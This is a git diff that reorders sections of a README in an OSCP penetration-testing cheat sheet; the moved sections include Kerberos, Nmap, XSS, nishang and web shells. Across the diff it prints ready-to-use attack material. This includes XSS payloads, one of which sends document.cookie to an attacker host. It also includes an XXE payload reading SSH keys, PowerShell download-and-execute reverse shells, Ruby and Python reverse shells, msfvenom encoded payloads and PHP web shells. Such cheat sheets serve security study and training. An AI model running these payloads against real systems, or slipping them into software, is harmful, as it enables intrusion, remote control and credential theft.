@@ -36,8 +36,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [curl](https://github.com/0xsyr0/OSCP#curl)
 		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
 		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
-		- [Linux](https://github.com/0xsyr0/OSCP#linux)
 		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
+		- [Linux](https://github.com/0xsyr0/OSCP#linux)
 		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
 		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
 		- [Ping](https://github.com/0xsyr0/OSCP#ping)
@@ -53,13 +53,14 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [VirtualBox](https://github.com/0xsyr0/OSCP#virtualbox)
 		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
 	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
-		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
 		- [memcached](https://github.com/0xsyr0/OSCP#memcached)
 		- [NetBIOS](https://github.com/0xsyr0/OSCP#netbios)
+		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
 		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
 		- [snmpwalk](https://github.com/0xsyr0/OSCP#snmpwalk)
 	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
 		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
+		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
 		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
 		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
 		- [GitTools](https://github.com/0xsyr0/OSCP#gittools)
@@ -74,7 +75,6 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [wfuzz](https://github.com/0xsyr0/OSCP#wfuzz)
 		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
 		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
-		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
 	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
 		- [MongoDB](https://github.com/0xsyr0/OSCP#mongodb)
 		- [MSSQL](https://github.com/0xsyr0/OSCP#mssql)
@@ -144,11 +144,11 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [Donut](https://github.com/0xsyr0/OSCP#donut)
 		- [Exiftool](https://github.com/0xsyr0/OSCP#exiftool)
 		- [GhostScript](https://github.com/0xsyr0/OSCP#ghostscript)
-		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
-		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
 		- [nishang](https://github.com/0xsyr0/OSCP#nishang)
+		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
 		- [ScareCrow](https://github.com/0xsyr0/OSCP#scarecrow)
 		- [Shikata Ga Nai](https://github.com/0xsyr0/OSCP#shikata-ga-nai)
+		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
 		- [ysoserial](https://github.com/0xsyr0/OSCP#ysoserial)
 	- [Templates](https://github.com/0xsyr0/OSCP#templates)
 		- [ASPX Web Shell](https://github.com/0xsyr0/OSCP#aspx-web-shell)
@@ -576,6 +576,26 @@ function __curl() {
 __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
+#### Kerberos
+
+```c
+sudo apt-get install krb5-kdc
+```
+
+```c
+/etc/krb5.conf                   // kerberos configuration file location
+kinit <USERNAME>                 // creating ticket request
+klist                            // show available kerberos tickets
+kdestroy                         // delete cached kerberos tickets
+.k5login                         // resides kerberos principals for login (place in home directory)
+krb5.keytab                      // "key table" file for one or more principals
+kadmin                           // kerberos administration console
+add_principal <EMAIL>            // add a new user to a keytab file
+ksu                              // executes a command with kerberos authentication
+klist -k /etc/krb5.keytab        // lists keytab file
+kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
+```
+
 #### Linux
 
 ##### CentOS
@@ -611,36 +631,16 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 ```
 
-#### vi
+##### vi
 
 ```c
 :w !sudo tee %    # save file with elevated privileges without exiting
 ```
 
-#### Windows Command Formatting
+##### Windows Command Formatting
 
 ```c
 echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
-```
-
-#### Kerberos
-
-```c
-sudo apt-get install krb5-kdc
-```
-
-```c
-/etc/krb5.conf                   // kerberos configuration file location
-kinit <USERNAME>                 // creating ticket request
-klist                            // show available kerberos tickets
-kdestroy                         // delete cached kerberos tickets
-.k5login                         // resides kerberos principals for login (place in home directory)
-krb5.keytab                      // "key table" file for one or more principals
-kadmin                           // kerberos administration console
-add_principal <EMAIL>            // add a new user to a keytab file
-ksu                              // executes a command with kerberos authentication
-klist -k /etc/krb5.keytab        // lists keytab file
-kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
 ```
 
 #### Microsoft Windows
@@ -850,19 +850,6 @@ venv\Scripts\activate
 
 ### Information Gathering
 
-#### Nmap
-
-```c
-sudo nmap -A -T4 -sC -sV -p- <RHOST>
-sudo nmap -sV -sU <RHOST>
-sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
-sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
-sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
-sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
-ls -lh /usr/share/nmap/scripts/*ssh*
-locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
-```
-
 #### memcached
 
 >  https://github.com/pd4d10/memcached-cli
@@ -896,6 +883,19 @@ get password
 ```c
 nbtscan <RHOST>
 nmblookup -A <RHOST>
+```
+
+#### Nmap
+
+```c
+sudo nmap -A -T4 -sC -sV -p- <RHOST>
+sudo nmap -sV -sU <RHOST>
+sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
+sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
+sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
+sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
+ls -lh /usr/share/nmap/scripts/*ssh*
+locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
 
 #### Port Scanning
@@ -940,6 +940,19 @@ Ctrl+Shift+u    // URL decoding
 ```c
 export HTTP_PROXY=http://localhost:8080
 export HTTPS_PROXY=https://localhost:8080
+```
+
+#### Cross-Site Scripting (XSS)
+
+```c
+<sCrIpt>alert(1)</ScRipt>
+<script>alert('XSS');</script>
+<script>alert(document.cookies)</script>
+<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
+<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
+<script>user.changeEmail('user@domain');</script>
+<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
+<img src='http://<RHOST>'/>
 ```
 
 #### ffuf
@@ -1711,19 +1724,6 @@ Content-Length: 136
 
 ```c
 username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
-```
-
-#### Cross-Site Scripting (XSS)
-
-```c
-<sCrIpt>alert(1)</ScRipt>
-<script>alert('XSS');</script>
-<script>alert(document.cookies)</script>
-<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
-<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
-<script>user.changeEmail('user@domain');</script>
-<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
-<img src='http://<RHOST>'/>
 ```
 
 ### Database Analysis
@@ -4411,6 +4411,20 @@ restore
 mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
 ```
 
+#### nishang
+
+```c
+cd path/to/nishang/Shells/
+cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
+
+tail -3 Invoke-PowerShellTcp.ps1
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
+
+powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
+```
+
 #### Reverse Shells
 
 ##### Bash Reverse Shell
@@ -4602,32 +4616,6 @@ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-#### Web Shells
-
-##### PHP Web Shell
-
-```c
-<?php system($_GET['cmd']); ?>
-<?php echo exec($_POST['cmd']); ?>
-<?php echo passthru($_GET['cmd']); ?>
-<?php passthru($_REQUEST['cmd']); ?>
-<?php echo system($_REQUEST['shell']): ?>
-```
-
-#### nishang
-
-```c
-cd path/to/nishang/Shells/
-cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
-
-tail -3 Invoke-PowerShellTcp.ps1
-}
-
-Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
-
-powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
-```
-
 #### ScareCrow
 
 ##### Payloads
@@ -4696,6 +4684,18 @@ For `.cpl-Files` a simple double click is enough to execute them.
 msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
+```
+
+#### Web Shells
+
+##### PHP Web Shell
+
+```c
+<?php system($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo system($_REQUEST['shell']): ?>
 ```
 
 #### ysoserial
